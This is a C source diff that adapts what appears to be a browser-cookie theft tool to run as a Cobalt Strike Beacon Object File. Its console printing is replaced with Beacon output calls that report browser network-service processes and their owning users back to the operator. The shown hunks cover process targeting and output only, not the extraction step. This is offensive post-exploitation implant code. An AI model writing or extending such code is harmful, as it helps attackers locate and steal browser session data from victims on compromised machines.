@@ -82,7 +82,7 @@ typedef NTSTATUS(NTAPI* NtQueryInformationProcess)(
 
 #define MAX_NAME 256
 
-BOOL GetTokenUser(IN HANDLE hProcess) {
+BOOL GetTokenUser(IN HANDLE hProcess, formatp* buffer) {
 
     HANDLE hToken = NULL;
     if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
@@ -129,9 +129,9 @@ BOOL GetTokenUser(IN HANDLE hProcess) {
         return FALSE;
     }
 
-    PRINT("%ls", DomainName);
-    PRINT("\\");
-    PRINT("%ls", UserName);
+    BeaconFormatPrintf(buffer, "%ls", DomainName);
+    BeaconFormatPrintf(buffer, "\\");
+    BeaconFormatPrintf(buffer, "%ls", UserName);
 
     free(hTokenUser);
     free(UserName);
@@ -252,10 +252,18 @@ BOOL FindCorrectProcessPID(LPCWSTR processName, DWORD* pid, HANDLE* hProcess)
                 {
                     if (CustomWcsStr(commandLine, flags) != 0)
                     {
-                        PRINT("Found browser process: %d\n", pe32.th32ProcessID);
-                        PRINT("    Process owner: ");
-                        GetTokenUser(hHandle);
-                        PRINT("\n\n");
+                        formatp buffer;
+                        int bufsize = MAX_NAME * 3;
+                        BeaconFormatAlloc(&buffer, bufsize); // RFC 6265 specifies: "At least 4096 bytes per cookie"
+
+                        BeaconFormatPrintf(&buffer, "Found browser process: %d\n", pe32.th32ProcessID);
+                        BeaconFormatPrintf(&buffer, "    Process owner: ");
+
+                        GetTokenUser(hHandle, &buffer);
+                        BeaconFormatPrintf(&buffer, "\n\n");
+
+                        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
+                        BeaconFormatFree(&buffer);
 
                         *pid = pe32.th32ProcessID;
                         *hProcess = hHandle;
@@ -298,6 +306,10 @@ void FindAllSuitableProcesses(LPCWSTR processName)
     //--utility-sub-type=network.mojom.NetworkService
     const WCHAR* flags = L"--utility-sub-type=network.mojom.NetworkService";
 
+    formatp buffer;
+    int bufsize = MAX_NAME * 3;
+    BeaconFormatAlloc(&buffer, bufsize);
+
     do
     {
         if (wcscmp(pe32.szExeFile, processName) == 0)
@@ -311,10 +323,14 @@ void FindAllSuitableProcesses(LPCWSTR processName)
                 {
                     if (CustomWcsStr(commandLine, flags) != 0)
                     {
-                        PRINT("Found browser process: %d\n", pe32.th32ProcessID);
-                        PRINT("    Process owner: ");
-                        GetTokenUser(hHandle);
-                        PRINT("\n\n");
+                        BeaconFormatPrintf(&buffer, "Found browser process: %d\n", pe32.th32ProcessID);
+                        BeaconFormatPrintf(&buffer, "    Process owner: ");
+
+                        GetTokenUser(hHandle, &buffer);
+                        BeaconFormatPrintf(&buffer, "\n\n");
+
+                        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
+                        BeaconFormatReset(&buffer);
                     }
                 }
                 free(commandLine);
@@ -324,6 +340,7 @@ void FindAllSuitableProcesses(LPCWSTR processName)
 
     } while (Process32NextW(hProcessSnap, &pe32));
 
+    BeaconFormatFree(&buffer);
     CloseHandle(hProcessSnap);
 }
 
